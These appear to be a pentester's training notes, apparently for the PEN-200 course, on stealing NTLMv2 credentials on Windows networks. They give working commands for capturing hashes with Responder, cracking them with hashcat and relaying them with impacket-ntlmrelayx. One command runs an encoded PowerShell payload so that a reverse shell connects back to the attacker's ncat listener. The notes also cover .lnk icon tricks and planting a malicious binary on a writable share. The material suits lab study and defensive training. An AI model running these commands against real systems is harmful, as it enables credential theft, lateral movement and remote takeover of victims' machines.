# NTLMv2 - Credential Theft
If we end up on a machine, as a NON-privileged user, we can force authentication back to our KALI machine, and capture the NTLMv2 hash with responder.
We crack this hash and then use it as normal.
If we can not crack it, we can also relay this hash to use on 3rd computer, if the hash belongs to an admin on the 3rd machine
Use impacket-ntlmrelayx  to relay hash and  authenticate it  to a 3rd machine:
	- Relyaing requires account owner of hash to be local admin on the 3rd machine
	- Relay examples on PEN-200 16.3.4 Q1, Q2

Listening with responder in analyze mode: 
```bash
sudo responder -I tun0 -A     #  Start Responder to listen and ANALYZE
dir \\kaliIP\fakeDIR          # Force authentication from WIN to KALI
```
We should now see a NTLMv2 hash in responder.
If we are unable to crack it, we can attempt to relay it instead.

Relay example:
- start ncat listener : `rlwrap ncat -nvlp 4444`
- create powershell base64 encoded payload, with IP and port, for KALI ncat listener
- impacket-ntlmrelayx is pointing to the IP of the 3rd computer we are relaying the hash to authenticate to
- If everything works we'll catch a RevShell from the 3rd computer as local admin/system
`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.205.212 -c "powershell -e JABApAA=="`

---
## Cracking NTLMv2 Hashes
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force

---
## Forced Authentication & .lnk File Abuse
Forced Authentication: 
	- Coerce Authentication via abusing legitimate file functions  
LNK icon smuggling:   
	- Coerce authenicaion via ICON paths
	- Execute malicious code via legitimate functions
	- WE can replace lnk files to point to a remote file
	- we can also make lnk files use binary, to exeucte some command we want
	- If you find a share we have write access to, upload our evil binary
	- Mount share  smbclient \\\\IP\ShareName  

---
